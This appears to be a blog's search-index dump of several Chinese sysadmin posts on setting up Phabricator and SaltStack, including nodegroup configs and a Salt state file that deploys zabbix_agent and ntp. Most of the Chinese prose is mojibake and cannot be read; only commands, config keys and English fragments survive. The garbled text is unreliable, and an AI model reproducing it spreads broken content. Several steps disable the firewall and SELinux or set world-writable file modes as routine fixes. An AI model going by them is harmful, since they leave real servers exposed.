ä¿®æ”¹ç™»å½•æ–¹å¼ç½‘é¡µä¸Šå¯ä»¥å¯¹å…¶è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚å…·ä½“ä½ç½®åœ¨ï¼šå·¦ä¾§èœå•Auth -&gt; Add Provider -&gt; username/password(è´¦å·å¯†ç æ–¹å¼ç™»å½•)æ”¯æŒ è´¦å·å¯†ç ç™»å½•ä»¥åŠç¬¬ä¸‰æ–¹ï¼ˆfacebookã€githubç­‰ï¼‰è´¦å·ç™»å½•ã€‚å¦å¤–ï¼Œå¯ä»¥é€‰æ‹©ç”¨æˆ·è‡ªä¸»æ³¨å†Œï¼Œæˆ–è€…ç¦ç”¨ï¼ˆç®¡ç†å‘˜é…ç½®ï¼‰ã€‚ è¿™é‡Œé€‰æ‹©LDAPåŒæ­¥éœ€è¦å®‰è£…PHP LDAPæ‰©å±•ï¼š 123Before you can set up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.yum install php-ldap -y æ³¨ï¼šå¦‚æœç¬¬ä¸€æ¬¡ç®¡ç†å‘˜ç™»å½•ä»¥åï¼Œæ²¡æœ‰ä¿®æ”¹ç™»å½•æ–¹å¼ï¼Œæ¥ç€é€€å‡ºã€‚ä¸‹æ¬¡ç™»å½•å¯èƒ½ä¼šè¢«é”ä½ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è§£é”ã€‚ 1/bin/auth recover &lt;username&gt; 1.2 è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼ä½¿ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Œåœ¨å·¦ä¾§çš„èœå•ä¸­é€‰æ‹© Auth ï¼Œç„¶åç‚¹å‡»å³ä¸Šä¾§ Add Providerï¼Œåœ¨åˆ—è¡¨ä¸­é€‰åˆ™ä½ éœ€è¦çš„è®¤è¯æ–¹å¼ã€‚ æˆ‘é€‰æ‹©æ˜¯Username/Passwordçš„æ–¹å¼ï¼Œå³ç”¨æˆ·è‡ªå·±æ³¨å†ŒPhabricatorè´¦å·ã€‚ä¸ºäº†ä¿éšœå®‰å…¨ï¼Œæˆ‘è®¾ç½®äº†åªå…è®¸å…¬å¸é‚®ç®±åœ°å€æ³¨å†Œï¼šConfig ---&gt; Core Settings ---&gt; Authentication ---&gt; auth.email-domainsã€‚ä½ è¿˜å¯ä»¥é€‰æ‹© auth.require-approval ï¼Œå³æ–°æ³¨å†Œç”¨æˆ·éœ€è¦ç®¡ç†å‘˜æ‰¹å‡†ã€‚ 1.3 è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°é¦–å…ˆï¼Œé…ç½® mail-adapter ï¼ˆé‚®ä»¶å‘é€æ–¹å¼ï¼‰ï¼šConfig ---&gt; Core Settings ---&gt; Mail ---&gt; metamta.mail-adapterï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ PhabricatorMailImplementationPHPMailerAdapter ï¼Œé€šè¿‡SMTPçš„æ–¹å¼å‘é€é‚®ä»¶ã€‚åœ¨é€‰æ‹©å®Œä¹‹åï¼Œéœ€è¦è®¾ç½®SMTPæœåŠ¡å™¨åœ°å€ã€è´¦å·å’Œå¯†ç ï¼šConfig â€”&gt; Core Settings â€”&gt; PHPMailer â€”&gt; metamta.mail-adapterï¼Œæ ¹æ®ä½ è‡ªå·±é‚®ç®±çš„é…ç½®ï¼Œç›¸åº”çš„è®¾ç½® phpmailer.smtp-hostã€phpmailer.smtp-portã€phpmailer.smtp-protocolã€phpmailer.smtp-userã€phpmailer.smtp-passwordã€phpmailer.smtp-encoding ã€‚ 2.é‚®ç®±å…³è”åˆ‡æ¢åˆ°phabricator/bin/ç›®å½•ä¸‹è¿è¡Œdaemonï¼š./bin/phd startã€‚ æ³¨æ„æ¯æ¬¡é‡å¯éœ€è¦å†æ¬¡å¯ç”¨ï¼Œå› æ­¤å»ºè®®æ”¾åˆ°å¯åŠ¨è„šæœ¬ä¸Šã€‚ é…ç½®mailï¼šé€šè¿‡webè®¿é—®phabricatorå¹¶åœ¨é¡µé¢ä¸Šè¿›è¡Œé…ç½®ï¼šï¼ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯å¤–éƒ¨SMTP serverçš„æ–¹å¼ï¼Œæ›´å¤šæ–¹å¼å‚è§phabricator docsï¼‰ ç”¨administratorè´¦å·ç™»å½•åï¼Œåœ¨administrationæ é€‰æ‹©Configè¿›å…¥ 1ï¼‰é€‰æ‹©mailï¼Œè®¾ç½® metamta.default-address â€“ xxxx@163.com // æ³¨æ„ï¼šè¿™é‡Œå¿…é¡»è¦ç”¨ä¸smtpæœåŠ¡å™¨å¯¹åº”çš„é‚®ç®±åœ°å€ï¼Œä¸ç„¶é‚®ä»¶å‘ä¸å‡ºå» metamta.domain -- phabricator.myproject.com // éšæ„ metamta.mail-adapter: set to &quot;PhabricatorMailImplementationPHPMailerAdapter&quot; metamta.send-immediately: Send Via Daemons ï¼ˆç›®å‰ç‰ˆæœ¬è²Œä¼¼æ²¡æœ‰ï¼‰ 2ï¼‰é€‰æ‹©PHPMailerï¼Œè®¾ç½®ï¼šï¼ˆä»¥163.comçš„SMTP serverä¸ºä¾‹ï¼‰ phpmailer.mailer: set to â€œsmtpâ€. ï¼ˆé»˜è®¤ï¼‰ phpmailer.smtp-host: smtp.163.com phpmailer.smtp-port: 25 ï¼ˆé»˜è®¤ï¼‰ phpmailer.smtp-user: xxxx phpmailer.smtp-password: xxxx ç›®å‰ç‰ˆæœ¬é¡µé¢ä¸Šä¸èƒ½é…ç½®PHPMailerï¼Œåªèƒ½ä½¿ç”¨å·¥å…·/bin/configå·¥å…·setç›¸å¯¹åº”çš„é…ç½®é¡¹ã€‚ 123phabricator/ $ ./bin/mail list-outbound # List outbound mail.phabricator/ $ ./bin/mail show-outbound # Show details about messages.phabricator/ $ ./bin/mail send-test # Send test messages. 3. å‚è€ƒï¼šhttps://www.oschina.net/question/191440_125562 Phabricatorå…¥é—¨æ‰‹å†Œ http://blog.csdn.net/zzllabcd/article/details/49997421 10.04Ubuntuå®‰è£… http://www.cnblogs.com/clovn/p/5103611.html debian7å®‰è£… https://secure.phabricator.com/book/phabricator/article/installation_guide/ å®˜æ–¹guider https://liuzhichao.com/p/1992.html Phabricator å®è·µä¹‹é…ç½®è´¦å·å’Œæ³¨å†Œ https://www.oschina.net/question/191440_125562 å…¥é—¨æ‰‹å†Œ http://www.jianshu.com/p/b1a75a14638c ç®€ä¹¦ä¸­çš„åˆ†äº«ï¼ˆè¾ƒä¸ºå®Œæ•´ï¼‰ http://www.cnblogs.com/ToDoToTry/p/3956687.html git serveræ­å»ºæŒ‡å— https://my.oschina.net/miger/blog/775609 linuxå¹³å°arcå·¥å…·çš„ä½¿ç”¨ http://blog.csdn.net/peapon/article/details/29881575 windowsä¸­arcçš„ä½¿ç”¨","link":"/2017/01/07/è‡ªåŠ¨åŒ–+Jenkins/Phabricator/Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·/"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--SaltStack-åˆ†ç»„ï¼ˆä½¿ç”¨è®°å½•,groupsï¼‰","text":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·â€“SaltStack-åˆ†ç»„ï¼ˆä½¿ç”¨è®°å½•,groupsï¼‰åœ¨ä½¿ç”¨ SaltStack å¯¹ä¸»æœºè¿›è¡Œæ‰¹é‡ç®¡ç†çš„æ—¶å€™ï¼Œå› ä¸ºä¸åŒçš„æœåŠ¡å™¨ç»„æ‰€åšçš„ä¸šåŠ¡åŠŸèƒ½ä¸åŒï¼Œå› æ­¤ä¸ºäº†æ›´åŠ æ–¹ä¾¿çš„ç®¡ç†ï¼Œä¸ºäº†ä¾¿äºç®¡ç†åŠŸèƒ½ä¸šåŠ¡ç›¸ä¼¼çš„minion,Saltstackæä¾›äº†åˆ†ç»„çš„æ¨¡å¼ï¼Œå› ä¸ºçº¿ä¸Šæœºå™¨å¤šï¼Œä¸å¯èƒ½æ¯æ¬¡éƒ½æ˜¯â€œ*â€æˆ–è€…â€œipä¸»æœºåâ€ è¿™æ ·ä¸ç°å®çš„ã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éƒ½æ˜¯æä¾›åˆ†ç»„ï¼Œå“ªé‡Œçš„æœºå™¨åˆ†å“ªä¸ªç»„è¿™æ ·ä½ æ“ä½œèµ·æ¥å°±æ–¹ä¾¿è€Œä¸”å®¹æ˜“æ’æŸ¥ï¼Œå› æ­¤å°±è‡ªå·±åœ¨åˆ†ç»„ä½¿ç”¨çš„è¿‡ç¨‹ä¸­æœ‰ä»¥ä¸‹ä¸€ç‚¹è®°å½•ä¸‹ã€‚ å®˜æ–¹æ–‡æ¡£ï¼šhttp://docs.saltstack.com/topics/targeting/nodegroups.html å‚è€ƒ SaltStack çš„å®˜æ–¹æ–‡æ¡£ 4.4 Compound matchers å’Œ 4.3. Node groups çŸ¥é“ï¼Œå¯¹ç›®æ ‡æœåŠ¡å™¨åˆ†ç»„æœ‰ä»¥ä¸‹ä¸ƒç§æ–¹å¼ï¼Œè¿™ä¸ƒç§æ–¹å¼çš„æ ‡ç¤ºç¬¦åˆ†åˆ«ä¸ºï¼š G â€“ é’ˆå¯¹ Grains åšå•ä¸ªåŒ¹é…ï¼Œä¾‹å¦‚ï¼šG@os:Ubuntu E â€“ é’ˆå¯¹ minion é’ˆå¯¹æ­£åˆ™è¡¨è¾¾å¼åšåŒ¹é…ï¼Œä¾‹å¦‚ï¼šE@web\\d+.(dev|qa|prod).loc P â€“ é’ˆå¯¹ Grains åšæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œä¾‹å¦‚ï¼šP@os:(RedHat|Fedora|CentOS) L â€“ é’ˆå¯¹ minion åšåˆ—è¡¨åŒ¹é…ï¼Œä¾‹å¦‚ï¼šL@minion1.example.com,minion3.domain.com or bl*.domain.com I â€“ é’ˆå¯¹ Pillar åšå•ä¸ªåŒ¹é…ï¼Œä¾‹å¦‚ï¼šI@pdata:foobar S â€“ é’ˆå¯¹å­ç½‘æˆ–æ˜¯ IP åšåŒ¹é…ï¼Œä¾‹å¦‚ï¼šS@192.168.1.0/24 or S@192.168.1.100 R â€“ é’ˆå¯¹å®¢æˆ·ç«¯èŒƒå›´åšåŒ¹é…ï¼Œä¾‹å¦‚ï¼š R@%foo.bar ç„¶åæˆ‘è‡ªå·±åœ¨åšåˆ†ç»„çš„æ—¶å€™ï¼Œå°è¯•äº†ä¸‹ L æ˜¯å¦å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ é…ç½®ï¼š ç¼–è¾‘é…ç½®æ–‡ä»¶ vi /etc/salt/master è¿™é‡Œå¤§çº¦706-714è¡Œï¼šåŸæ–‡ï¼š 12345678##### Node Groups ################################################ Node groups allow for logical groupings of minion nodes. A group consists of a group# name and a compound target.#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com' ç»¿è‰²çš„æ˜¯æŒ‡å®šç»„åï¼šå¯ä»¥å®šä¹‰è‡ªå·±å¥½è®°çš„ç»„åï¼Œåº”ç”¨æœåŠ¡å™¨æ˜¯éœ€è¦åŒæ ·é…ç½®çš„ï¼Œå¯ä»¥æ”¾åœ¨åŒä¸€ä¸ªåˆ†ç»„ã€‚ä¿®æ”¹é…ç½®ï¼šæ³¨æ„ï¼šè¿™é‡Œç»„åå‰é¢ï¼šéœ€è¦ç©ºæ ¼ï¼Œæ¯ä¸ªç”¨æˆ·keyåç§°ï¼Œéƒ½é€—å·éš”å¼€ã€‚ 12345#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: ''L@d_104_article_1,d_108_account_1,d_109_comm_1,d_110_consumer_1â€˜ihaozhuo2: 'L@api' æˆ‘ä»¬æ¥æµ‹è¯•ä¸‹ï¼š -N æ˜¯æŒ‡å®šåˆ†ç»„åç§°ï¼š æ‰§è¡Œå‘½ä»¤ sudo salt -N â€œihaozhuo1â€ test.pingç»“æœä¸ºï¼š 123456789101112[root@jumper ~]# salt -N 'ihaozhuo1' test.pingd_104_article_1: Trued_108_account_1: Trued_109_comm_1: Trued_110_consumer_1: True[root@jumper ~]# salt -N 'ihaozhuo2' test.pingapi: True åˆ†ç»„åˆ†å¥½å‡ å°ä¸€èµ·ï¼Œæ˜¯å¯ä»¥è·å–çš„ã€‚åŒ¹é…æŒ‡å®šçš„key ä¿®æ”¹é…ç½®å°è¯•ä¸€ï¼š 1234#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: â€˜ L@JF1-TEST1-001,JF1-TEST1-002 or JF-TEST1-0[0-9][0-9]' æ‰§è¡Œå‘½ä»¤ sudo salt -N TEST1 test.pingç»“æœä¸ºï¼š 123456789101112JF1-TEST1-002: TrueJF1-TEST1-001: TrueJF1-TEST1-003: TrueJF1-TEST1-004: TrueJF1-TEST1-006: TrueJF1-TEST1-005: True åŒ¹é…äº†æ‰€æœ‰æŒ‡å®šçš„key. ä½¿ç”¨ L åˆ—è¡¨çš„æ–¹å¼ï¼Œå¿…é¡»æŠŠ minion åˆ—å‡ºæ¥ï¼Œæˆ–è€…æ˜¯åˆ—å‡ºå‡ å°åï¼Œåœ¨åé¢æ¥ or æˆ–è€… and è¡¨è¾¾å¼ï¼Œ or æˆ–è€… and åé¢æ¥çš„è¡¨è¾¾å¼åé¢å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ã€‚ æ³¨ï¼šæƒ³ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œæœ€å¥½çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨E","link":"/2015/11/01/è‡ªåŠ¨åŒ–+Jenkins/saltstack/è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--SaltStack-åˆ†ç»„ï¼ˆä½¿ç”¨è®°å½•,groupsï¼‰ /"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--Saltstackå†™slsè¯­æ³•æ‰¹é‡éƒ¨ç½²zabbix_agent","text":"Saltstackæ‰¹é‡éƒ¨ç½²zabbix_agentæœåŠ¡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576epel_install: file.managed: - name: /root/zabbix-release-2.4-1.el6.noarch.rpm ## æŒ‡å®šèŠ‚ç‚¹çš„epelå®‰è£…åŒ…çš„å­˜æ”¾è·¯å¾„ - source: salt://epel/zabbix-release-2.4-1.el6.noarch.rpm ## æŒ‡å®šä»masterçš„å“ªä¸ªä½ç½®æ‹·è´epelçš„rpmåŒ… - user: root ## æ–‡ä»¶çš„æ‹¥æœ‰è€… - group: root ## æ–‡ä»¶çš„æ‰€å±ç»„ - mode: 777 - backup: minion cmd.run: - name: rpm -ivh /root/zabbix-release-2.4-1.el6.noarch.rpm ## æ‰§è¡ŒrpmåŒ…çš„å®‰è£… - unless: test -f /etc/yum.repos.d/epel.repo ## å¦‚æœå­˜åœ¨è¿™ä¸ªæ–‡ä»¶å°±ä¸å†æ‰§è¡Œå®‰è£…ç¨‹åº - require: - file: epel_installSELINUX: cmd.run: - name: service iptables stop &amp;&amp; chkconfig iptables off &amp;&amp; setenforce 0 #sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config - require: - file: epel_installcache_yum: cmd.run: - name: yum makecache ## ç”Ÿæˆyumçš„ç¼“å­˜ - require: - file: epel_install ## ç”Ÿæˆç¼“å­˜è¦åœ¨epelå®‰è£…ä¹‹åzabbix-agentd: pkg.installed: [] service.running:# - name: zabbix-agent# - running - enable: True - reload: True - watch: - file: /etc/zabbix/zabbix_agentd.conf - require: - file: epel_install/etc/zabbix/zabbix_agentd.conf: file.managed: - source: salt://zabbix/zabbix_agentd.conf - user: zabbix ## æ–‡ä»¶çš„æ‹¥æœ‰è€… - group: zabbix ## æ–‡ä»¶çš„æ‰€å±ç»„ - mode: 644 - backup: minion - template: jinja - require: - file: epel_installntp: pkg.installed: [] ## å®‰è£…ntp # name: ntp service.running:# name: ntpd# running enable: True reload: True watch: file: /etc/ntp.conf require: ## å®‰è£…ntpè¦åœ¨epelå®‰è£…ä¹‹å file: epel_install/etc/ntp.conf: file.managed: - source: salt://ntp/ntp.conf - user: root ## æ–‡ä»¶çš„æ‹¥æœ‰è€… - group: root ## æ–‡ä»¶çš„æ‰€å±ç»„ - mode: 644 - backup: minion - require: - file: epel_install","link":"/2015/11/01/è‡ªåŠ¨åŒ–+Jenkins/saltstack/è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--Saltstackå†™slsè¯­æ³•æ‰¹é‡éƒ¨ç½²zabbix_agent/"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·-æœåŠ¡è‡ªåŠ¨åŒ–éƒ¨ç½²å¹³å°ä¹‹Saltstackæ€»ç»“","text":"æœåŠ¡è‡ªåŠ¨åŒ–éƒ¨ç½²å¹³å°ä¹‹Saltstackæ€»ç»“Saltstackæ˜¯ä¸€ä¸ªæ–°çš„åŸºç¡€è®¾æ–½ç®¡ç†å·¥å…·ã€‚ç›®å‰å¤„äºå¿«é€Ÿå‘å±•é˜¶æ®µï¼Œå¯ä»¥çœ‹åšæ˜¯å¼ºåŒ–çš„Func+å¼±åŒ–çš„Puppetçš„ç»„åˆã€‚é—´æ¥çš„åæ˜ å‡ºäº†saltstackçš„ä¸¤å¤§åŠŸèƒ½ï¼šè¿œç¨‹æ‰§è¡Œå’Œé…ç½®ç®¡ç†ã€‚ SaltStack ä¿æŒäº†è¾“å…¥ã€è¾“å‡ºã€é…ç½®æ–‡ä»¶çš„ä¸€è‡´æ€§ï¼Œæ‰€æœ‰æ–‡ä»¶å‡ä½¿ç”¨YAMLæ ¼å¼ã€‚ä¸»è¦è´Ÿè´£é…ç½®ç®¡ç†å’Œè¿œç¨‹æ‰§è¡Œï¼ˆåœ¨è¿œç¨‹ä¸»æœºè¿è¡Œé¢„å®šä¹‰æˆ–ä»»æ„çš„å‘½ä»¤ï¼Œä¹Ÿå«è¿œç¨‹æ‰§è¡Œï¼Œè¿™æ˜¯ Saltçš„æ ¸å¿ƒåŠŸèƒ½ã€‚æ¥ä¸‹æ¥çš„é“¾æ¥å±•ç¤ºäº†æ¨¡å—ï¼ˆmoduleï¼‰å’Œè¿”å›å™¨ï¼ˆreturnerï¼‰ï¼Œè¿™æ˜¯è¿œç¨‹æ‰§è¡Œçš„å…³é”®æ‰€åœ¨ã€‚ï¼‰ Saltæ˜¯åŸºäºpythonå†™çš„ç»å…¸C/Sæ¡†æ¶çš„è‡ªåŠ¨åŒ–éƒ¨ç½²å¹³å°ã€‚ç”±Masterå’ŒMinionæ„æˆï¼Œé€šè¿‡ZeroMQè¿›è¡Œé€šä¿¡ã€‚ Masterä¸Minionè®¤è¯ 1.minion åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶ï¼Œä¼šåœ¨/etc/salt/pki/minion/ï¼ˆè¯¥è·¯å¾„åœ¨/etc/salt/minioné‡Œé¢è®¾ç½®ï¼‰ä¸‹è‡ªåŠ¨ç”Ÿæˆ minion.pem(private key)å’Œminion.pub(public key)ï¼Œç„¶åå°†minion.pubå‘é€ç»™masterã€‚ 2.master åœ¨æ¥æ”¶åˆ°minionçš„public keyåï¼Œé€šè¿‡salt-keyå‘½ä»¤accept minion public keyï¼Œè¿™æ ·åœ¨masterçš„/etc/salt/pki/master/minionsä¸‹çš„å°†ä¼šå­˜æ”¾ä»¥minion idå‘½åçš„public key, ç„¶åmasterå°±èƒ½å¯¹minionå‘é€æŒ‡ä»¤äº†ã€‚ Masterä¸Minionçš„è¿æ¥ Saltstack masterå¯åŠ¨åé»˜è®¤ç›‘å¬4505å’Œ4506ä¸¤ä¸ªç«¯å£ã€‚4505(publish_port)ä¸ºsaltçš„æ¶ˆæ¯å‘å¸ƒç³»ç»Ÿï¼Œ4506(ret_port) ä¸ºsaltå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ã€‚å¦‚æœä½¿ç”¨lsofæŸ¥çœ‹4505ç«¯å£ï¼Œä¼šå‘ç°æ‰€æœ‰çš„Minionåœ¨4505ç«¯å£æŒç»­ä¿æŒåœ¨ESTABLISHED å‚è€ƒæ–‡æ¡£: http://blog.javachen.com/2013/11/18/study-note-of-saltstack/ ç»å…¸æ­å»ºæ¡†æ¶http://www.linuxyw.com/179.html saltæ­å»ºå‚è€ƒ http://blog.halfss.com/blog/2013/05/22/yun-wei-zi-dong-hua-zhi-saltxue-xi-bi-ji/ saltçš„å®‰è£…ï¼š masterç«¯ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#yum install salt-master -y saltä¸»æ§ç«¯å®‰è£…#vim /etc/salt/master saltä¸»é…ç½®æ–‡ä»¶ä¿®æ”¹interface: æœåŠ¡ç›‘å¬IPauto_accept: Trueï¼ˆå¯é€‰ï¼Œkeyé€šè¿‡â€˜salt-key -a keynameâ€™å‘½ä»¤æ‰‹åŠ¨è¿›è¡Œè®¤è¯ï¼‰æ³¨æ„ï¼škeyname å°±æ˜¯å®¢æˆ·ç«¯ä¸­è®¾ç½®çš„idæ ‡è¯†(å¯ä»¥æŸ¥çœ‹salt-minionç«¯çš„é…ç½®)#salt-master -l debug debugæ¨¡å¼ï¼ŒæŸ¥çœ‹saltéƒ½è¿›è¡Œå“ªäº›æ“ä½œ#/etc/init.d/salt-master restart é‡å¯saltæœåŠ¡#/etc/init.d/salt-master status æŸ¥çœ‹çŠ¶æ€#netstat -antlp | grep 4505 ç¡®ä¿æ¶ˆæ¯å‘å¸ƒç«¯å£æ­£å¸¸#netstat -antlp | grep 4506 ç¡®ä¿å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡ç«¯å£æ­£å¸¸#/etc/init.d/salt-master restart# /etc/init.d/salt-master status# salt-key æŸ¥çœ‹è®¤è¯ç›¸å…³ä¿¡æ¯# salt-key -a wy-pe2 æ‰‹åŠ¨æ·»åŠ è®¤è¯key(ç»™wy-pe2ä¸»æœºæ·»åŠ è®¤è¯)#iptables -F å…³é—­é˜²ç«å¢™ä»¥å…å½±å“è®¤è¯#salt-key -a wy-pe2#salt-key -L æŸ¥çœ‹è®¤è¯ä¿¡æ¯(ä¼šæœ‰æ˜¾ç¤ºå·²ç»è®¤è¯å’Œæœªè®¤è¯çš„ç›¸å…³ä¿¡æ¯)[root@wy-pe1 ~]# salt-key -LAccepted Keys:wy-pe2 å·²ç»å…è®¸çš„key(è¡¨ç¤ºwy-pe2å·²ç»å…è®¸è®¤è¯äº†)Unaccepted Keys:Rejected Keys:#cd /etc/salt/pki/master/minions åœ¨masterä¸­çš„minionsç›®å½•ä¸­ç”Ÿæˆè®¤è¯çš„key#setenforce 0 æš‚æ—¶å…³é—­selinux#/etc/init.d/salt-master restartæ‰§è¡Œè¿œç¨‹å‘½ä»¤(ä½¿ç”¨saltå†…å»ºçš„æ¨¡å—):#salt â€˜wy-pe2â€² test.ping æµ‹è¯•masterå’Œminionè¿›è¡Œé€šä¿¡(åœ¨masterç«¯è¿›è¡Œpingå“åº”æµ‹è¯•)[root@wy-pe1 ~]# salt â€˜wy-pe2â€² test.ping å¦‚æœèƒ½pingé€šï¼Œåˆ™ä¸ºTruewy-pe2:True#lsof -i:4505 æŸ¥çœ‹åˆ°minionç«¯éƒ½å’Œ4505ä¿æŒå»ºç«‹[root@wy-pe1 ~]# lsof -i:4505COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEsalt-mast 8568 root 12u IPv4 63217 0t0 TCP *:4505 (LISTEN)salt-mast 8568 root 14u IPv4 65101 0t0 TCP wy-pe1:4505-&gt;wy-pe2:51237 (ESTABLISHED)(è¡¨ç¤ºå»ºç«‹è¿æ¥äº†)æ³¨æ„:å¦‚æœè®¤è¯é‚£å—æ²¡åšå¥½ï¼Œå°±ä¼šå½±å“ç›¸å…³çš„é“¾æ¥ Saltå®¢æˆ·ç«¯å®‰è£…ï¼š minionç«¯å®‰è£…é…ç½®ï¼š 12345678910111213141516171819202122232425#yum install salt-minion -y#vim /etc/salt/minion ä¿®æ”¹minionå®¢æˆ·ç«¯ä¸»é…ç½®master: æœåŠ¡ç«¯ä¸»æœºåid: å®¢æˆ·ç«¯ä¸»æœºå(å…¶å®ä¹Ÿå°±æ˜¯è®¤è¯keyçš„åå­—) ç”¨æ¥å’Œmasterè¿›è¡Œè®¤è¯#/etc/init.d/salt-minion restart é‡å¯æœåŠ¡#cd /etc/salt/pki/minion/ åœ¨è¿™ä¸ªç›®å½•åº•ä¸‹ä¼šç”Ÿæˆä¸¤ä¸ªè®¤è¯æ–‡ä»¶(minion.pub minion.pem)salt-minionç«¯ä¸èƒ½æ­£å¸¸å¯åŠ¨çš„è§£å†³æ­¥éª¤:ï¼ˆä¸€èˆ¬å°±æ˜¯iptableså’Œselinuxçš„å½±å“ï¼‰#/etc/init.d/salt-minion restart# tail -f /var/log/messages#/etc/init.d/salt-minion restart#iptables -F#tail -f /var/log/salt/minion#salt-minion -l debug#setenforce 0#/etc/init.d/salt-minion restartå®‰è£…å®Œæ¯•ï¼Œåœ¨masterå’Œminionè®¤è¯å®Œæ¯•ä¹‹åä¼šåœ¨minionä¸»æœºä¸Šçš„/etc/salt/pki/minion/ç›®å½•åº•ä¸‹ç”Ÿæˆæ–°çš„minion_master.pubé—®é¢˜1ï¼šæ¡£masterå’Œminionè¿›è¡Œè®¤è¯çš„æ—¶å€™ï¼Œmasteræ²¡æœ‰æ¥æ”¶åˆ°public key(minion)(è¿™ä¸ªåœ¨åæ¥çš„é“¾æ¥è¿‡ç¨‹ä¸­ä¼šé€ æˆmasterå’Œminionä¸èƒ½é“¾æ¥)é—®é¢˜2ï¼šè¾…æœºsalt-minionæ€»æ˜¯åœ¨æŸ¥çœ‹æœåŠ¡çŠ¶æ€çš„æ—¶å€™æ˜¾ç¤ºå¤±è´¥(but pid exitsï¼)# salt-minion -l debug æŸ¥çœ‹saltå®¢æˆ·ç«¯è¯¦ç»†ä¿¡æ¯ saltçš„ç®€å•ä½¿ç”¨ï¼š12345saltå¯ä»¥ç›´æ¥è®©minionæ‰§è¡Œæ¨¡å—å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œshellå‘½ä»¤1.salt -C â€˜wy-pe1 and wy-pe2 or wy-peNâ€™ test.ping -Cè¡¨ç¤ºå¤šå‚æ•°(è¡¨ç¤ºåœ¨æµ‹è¯•å¤šå°ä¸»æœºçš„å­˜æ´»çŠ¶æ€)# salt â€˜*â€™ disk.usage æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ(ä½¿ç”¨å†…å»ºæ¨¡å—æŸ¥çœ‹æ‰€æœ‰minionç«¯çš„ç£ç›˜ä½¿ç”¨æƒ…å†µ)#salt â€˜*â€™ cmd.run â€˜df -hâ€™ ä½¿ç”¨cmd.runç›´æ¥è°ƒç”¨è¿œç¨‹shellå‘½ä»¤(åŠŸèƒ½åŒä¸Š)# salt â€˜*â€™ cmd.run â€œcat /root/lallâ€ æŸ¥çœ‹å®¢æˆ·ç«¯ä¸»æœºçš„/root/lallæ–‡ä»¶ 2.nodegroupå¯¹minionè¿›è¡Œåˆ†ç»„ï¼š123456789nodegroups:group1: â€˜L@foo.domain.com,bar.domain.com,baz.domain.com or bl*.domain.comâ€™group2: â€˜G@os :Debian and foo.domain.comâ€™group3:â€™wy-pe2â€²è¿›è¡Œåˆ†ç»„æµ‹è¯•ï¼š# salt -N group3 test.pingwy-pe2:True 3.grainså¯¹minionåŸºæœ¬ä¿¡æ¯çš„ç®¡ç†ï¼š12salt â€˜wy-pe2â€² grins.ls æŸ¥çœ‹grainsåˆ†ç±»salt â€˜wy-pe2â€² grins.items æŸ¥çœ‹minnonåŸºæœ¬ä¿¡æ¯(ç¡¬ä»¶å‚æ•°) ###4.pillarå¯¹æ•æ„Ÿä¿¡æ¯çš„ç®¡ç†ï¼Œåªæœ‰åŒ¹é…åˆ°çš„èŠ‚ç‚¹æ‰èƒ½è·å–å’Œä½¿ç”¨ 1234567891011121314151617181920212223242526272829303132é»˜è®¤pillaræ•°æ®å®šä¹‰æ–‡ä»¶å­˜å‚¨è·¯å¾„:/srv/pillarçŠ¶æ€ç®¡ç†ï¼š1.saltåŸºäºminionè¿›è¡ŒçŠ¶æ€çš„ç®¡ç†(state)ç±»ä¼¼äºpupetçš„ppæ–‡ä»¶åŠŸèƒ½ï¼Œsaltçš„stateæ–‡ä»¶æ‰©å±•æ–‡ä»¶åä¸º.sls,é‡‡ç”¨çš„æ˜¯å’Œpuppetä¸€æ ·çš„è®¾è®¡æ€è·¯ã€‚å³ä»¥masterç«¯çš„æ–‡ä»¶çŠ¶æ€æ¥ç¡®å®šminionç«¯çš„ä¸€äº›çŠ¶æ€ä¿¡æ¯è®¾ç½®ã€‚(å®‰è£…çš„è½¯ä»¶åŒ…ï¼ŒæœåŠ¡çš„è¿è¡ŒçŠ¶æ€ä»¥åŠéœ€è¦åŒæ­¥çš„æ–‡ä»¶é…ç½®)æ³¨æ„ï¼šsalté»˜è®¤çš„æ 